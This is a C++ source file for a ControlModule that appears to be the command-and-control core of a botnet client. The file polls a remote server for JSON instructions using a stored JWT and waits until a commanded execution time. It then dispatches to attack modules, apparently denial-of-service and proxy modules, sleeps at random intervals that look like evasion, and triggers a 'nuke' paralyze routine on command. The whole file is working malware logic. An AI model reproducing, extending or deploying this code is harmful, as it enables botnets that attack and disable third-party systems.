#include "ControlModule.h"
#include "DoSModule.h"
#include "NukeModule.h"
#include "ProxyModule.h"
#include <random>
#include <thread>

ControlModule::ControlModule(const std::string &server_address, int server_port)
    : NetworkModule(server_address, server_port) {}

ControlModule::~ControlModule() { get_socket().lowest_layer().close(); }

nlohmann::json ControlModule::fetch_instructions() {
  try {
    BotLogger::getInstance().save_log("Fetching instructions...",
                                      LogLevel::INFO, BotModules::CONTROL);
    std::vector<std::byte> response;

    if (!send_https_get_request(m_api_endpoints["instructions"], response)) {
      return nlohmann::json();
    };

    BotLogger::getInstance().save_log("Parsing instructions...",
                                      LogLevel::TRACE, BotModules::CONTROL);
    nlohmann::json instructions = nlohmann::json::parse(response);
    BotLogger::getInstance().save_log("Instructions fetched successfully.",
                                      LogLevel::INFO, BotModules::CONTROL);
    return instructions;
  } catch (const std::exception &e) {
    BotLogger::getInstance().save_exception(e, LogLevel::ERROR,
                                            BotModules::CONTROL);
    return nlohmann::json();
  }
}

void ControlModule::evaluate_basic_instructions(
    const nlohmann::json &instructions) {
  try {
    BotLogger::getInstance().save_log("Evaluating instructions...",
                                      LogLevel::INFO, BotModules::CONTROL);
    if (instructions.contains("execution_time")) {
      BotLogger::getInstance().save_log("Waiting until execution time...",
                                        LogLevel::INFO, BotModules::CONTROL);
      std::string execution_time = instructions["execution_time"];
      wait_until_time(execution_time);
    }
    evaluate_module(instructions);
  } catch (const std::exception &e) {
    BotLogger::getInstance().save_exception(e, LogLevel::ERROR,
                                            BotModules::CONTROL);
  }
}

void ControlModule::evaluate_module(const nlohmann::json &instructions) {
  std::string module_name;
  if (instructions.contains("module")) {
    module_name = instructions["module"];
    BotLogger::getInstance().save_log("Module name found: " + module_name,
                                      LogLevel::TRACE, BotModules::CONTROL);
  } else {
    BotLogger::getInstance().save_log("Module name not found.",
                                      LogLevel::WARNING, BotModules::CONTROL);
    random_sleep();
    return;
  }
  try {
    BotLogger::getInstance().save_log("Evaluating module instructions for " +
                                          module_name + "...",
                                      LogLevel::INFO, BotModules::CONTROL);
    for (const auto &module : m_modules) {
      if (module_name == module->get_module_name()) {
        BotLogger::getInstance().save_log("Executing " + module_name +
                                              " module...",
                                          LogLevel::INFO, BotModules::CONTROL);
        module->execute_module(instructions);
        random_sleep();
        return;
      }
    }
    BotLogger::getInstance().save_log("Module " + module_name +
                                          " not found in registered modules.",
                                      LogLevel::WARNING, BotModules::CONTROL);
    random_sleep();
  } catch (const std::exception &e) {
    BotLogger::getInstance().save_log("Failed to execute module " + module_name,
                                      LogLevel::ERROR, BotModules::CONTROL);
    BotLogger::getInstance().save_exception(e, LogLevel::ERROR,
                                            BotModules::CONTROL);
  }
}

void ControlModule::execute_module(const nlohmann::json &instructions) {
  try {
    BotLogger::getInstance().save_log("Executing module instructions...",
                                      LogLevel::TRACE, BotModules::CONTROL);
    if (instructions.contains("sleep")) {
      evaluate_sleep(instructions);
    }
    if (instructions.contains("nuke")) {
      NukeModule nuke;
      nuke.nuke_paralyze();
    }
  } catch (const std::exception &e) {
    BotLogger::getInstance().save_exception(e, LogLevel::ERROR,
                                            BotModules::CONTROL);
  }
}

void ControlModule::random_sleep() {
  std::random_device rd;
  std::mt19937 gen(rd());
  std::uniform_int_distribution<> dis(1, 60);
  int sleep_time = dis(gen);
  BotLogger::getInstance().save_log("Sleeping for " +
                                        std::to_string(sleep_time) + " seconds",
                                    LogLevel::INFO, BotModules::CONTROL);
  std::this_thread::sleep_for(std::chrono::seconds(sleep_time));
}

void ControlModule::wait_until_time(const std::string &time) {
  if (time == "now") {
    return;
  }
  std::string current_time =
      BotEssentials::getInstance().get_current_time_as_string();
  while (current_time != time) {
    BotLogger::getInstance().save_log("Waiting for " + time, LogLevel::INFO,
                                      BotModules::CONTROL);
    std::this_thread::sleep_for(std::chrono::seconds(1));
    current_time = BotEssentials::getInstance().get_current_time_as_string();
  }
}

void ControlModule::evaluate_sleep(const nlohmann::json &instructions) {
  try {
    BotLogger::getInstance().save_log("Evaluating sleep instructions...",
                                      LogLevel::INFO, BotModules::CONTROL);
    if (instructions["sleep"] == "random") {
      random_sleep();
      return;
    }

    int sleep = instructions["sleep"];
    BotLogger::getInstance().save_log("Sleeping for " + std::to_string(sleep) +
                                          " seconds",
                                      LogLevel::INFO, BotModules::CONTROL);
    std::this_thread::sleep_for(std::chrono::seconds(sleep));

  } catch (const nlohmann::json::exception &e) {
    BotLogger::getInstance().save_log("Failed to parse sleep instructions.",
                                      LogLevel::ERROR, BotModules::CONTROL);
    BotLogger::getInstance().save_exception(e, LogLevel::ERROR,
                                            BotModules::CONTROL);
  } catch (const std::exception &e) {
    BotLogger::getInstance().save_exception(e, LogLevel::ERROR,
                                            BotModules::CONTROL);
  }
}

void ControlModule::register_module(std::shared_ptr<IModule> module) {
  m_modules.push_back(module);
}

std::vector<std::shared_ptr<IModule>> ControlModule::get_modules() const {
  return m_modules;
}

void ControlModule::start_module() {
  if (!BotEssentials::getInstance().check_file_existance(get_jwt_file())) {
    BotLogger::getInstance().save_log("Requesting JWT...", LogLevel::TRACE,
                                      BotModules::CONTROL);
    if (!receive_jwt()) {
    }
    random_sleep();
  } else {
    BotLogger::getInstance().save_log("JWT already exists.", LogLevel::TRACE,
                                      BotModules::CONTROL);
    set_jwt(get_jwt_from_file());
  }
  while (true) {
    nlohmann::json instructions = fetch_instructions();
    if (instructions.empty()) {
      random_sleep();
      continue;
    }
    evaluate_basic_instructions(instructions);
  }
}